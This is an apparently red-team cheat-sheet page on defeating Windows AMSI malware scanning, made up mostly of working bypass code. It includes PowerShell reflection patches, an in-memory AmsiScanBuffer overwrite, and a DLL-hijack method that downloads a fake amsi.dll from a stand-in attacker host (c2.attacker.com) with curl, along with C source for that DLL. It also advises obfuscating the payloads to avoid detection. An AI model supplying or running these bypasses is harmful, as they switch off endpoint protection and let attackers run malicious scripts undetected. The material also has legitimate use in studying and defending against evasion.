---
title: AMSI
---

Endpoint protection software uses the *Antimalware Scan Interface* to prevent PowerShell, VBScript, JScript and Office VBA macros from executing if they match known bad patterns.

> **OpSec:**
> The payloads below require obfuscation.
> Heavily obfuscated payloads are detected more frequently than payloads that are only slightly modified in the right place.

Patch AMSI in PowerShell with Matt Graebers reflection method.

~~~ ps1
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed', 'NonPublic,Static')
$b.SetValue($null, $true)
$b.GetValue($null)
~~~

Variation for PowerShell 6.

~~~ ps1
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('s_amsiInitFailed', 'NonPublic,Static')
$b.SetValue($null, $true)
$b.GetValue($null)
~~~

Variation from OSEP.

~~~ ps1
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'}
[IntPtr]$c = $b.GetValue($null)
[Int32[]]$d = @(0xff)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
~~~

Patch AMSI at process-level with Rasta Mouse's [AmsiScanBufferBypass](https://github.com/rasta-mouse/AmsiScanBufferBypass).

~~~ powershell
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
'@
$a = [Win32]::LoadLibrary('amsi.dll')
$b = [Win32]::GetProcAddress('AmsiScanBuffer')
$c = 0
[Win32]::VirtualProtect($b, [uint32]3, 0x40, [ref]$c)
$d = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $b, 6)
[Win32]::VirtualProtect($b, [uint32]3, 0x20, [ref]$c)
~~~

Variation from [senzee1984](https://github.com/senzee1984/Amsi_Bypass_In_2023/blob/main/Attack_AmsiScanBuffer.ps1).

Alternatively copy `powershell.exe` and a fake `asmi.dll` into a temporary directory ([source](https://twitter.com/eversinc33/status/1666121784192581633)).

~~~ bat
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe .
copy C:\Windows\System32\amsi.dll amsiorg.dll
curl.exe -O https://c2.attacker.com/amsi.dll
.\powershell.exe
~~~

`./amsi.c` ([source](https://gist.github.com/eversinc33/beb43d05695de77a030c97ab769682ca)):

~~~ c
#include <windows.h>
#pragma comment(linker, "/export:AmsiCloseSession=amsiorg.AmsiCloseSession,@1")
#pragma comment(linker, "/export:AmsiInitialize=amsiorg.AmsiInitialize,@2")
#pragma comment(linker, "/export:AmsiOpenSession=amsiorg.AmsiOpenSession,@3")
#pragma comment(linker, "/export:AmsiScanString=amsiorg.AmsiScanString,@5")
#pragma comment(linker, "/export:AmsiUacInitialize=amsiorg.AmsiUacInitialize,@6")
#pragma comment(linker, "/export:AmsiUacScan=amsiorg.AmsiUacScan,@7")
#pragma comment(linker, "/export:AmsiUacUninitialize=amsiorg.AmsiUacUninitialize,@8")
#pragma comment(linker, "/export:AmsiUninitialize=amsiorg.AmsiUninitialize,@9")
#pragma comment(linker, "/export:DllCanUnloadNow=amsiorg.DllCanUnloadNow,@10")
#pragma comment(linker, "/export:DllGetClassObject=amsiorg.DllGetClassObject,@11")
#pragma comment(linker, "/export:DllRegisterServer=amsiorg.DllRegisterServer,@12")
#pragma comment(linker, "/export:DllUnregisterServer=amsiorg.DllUnregisterServer,@13")

__declspec(dllexport) HRESULT AmsiScanBuffer(HANDLE context, PVOID buffer, ULONG length, LPCWSTR name, LPVOID session, INT* result) {
    *result = 0;
    return S_OK;
}

BOOL DllMain(HMODULE module, DWORD reason, LPVOID reserved) {
    return true;
}
~~~

Untested tools:

- [AMSITools](https://github.com/mgeeky/penetration-testing-tools/tree/master/red-teaming/amsitools), pulls AMSI events to troubleshoot AMSI detections
- [AMSITrigger](https://github.com/rythmstick/amsitrigger), identify what part of a script triggers AMSI

References:

- [Antivirus Evasion: Tearing AMSI down with 3 bytes only](http://web.archive.org/web/20230111134440/https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/), patching `AmsiOpenSession` doesn't result in a process-level AMSI bypass
- [New AMSI bypass using CLR hooking](http://web.archive.org/web/20221229140935/https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/)
- [AMSI unchained - Blackhat Asia 2022](./amsi-unchained-blackhat-asia-2022.pdf), examples for multiple bypass techniques
- [Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), collection of AMSI bypass methods
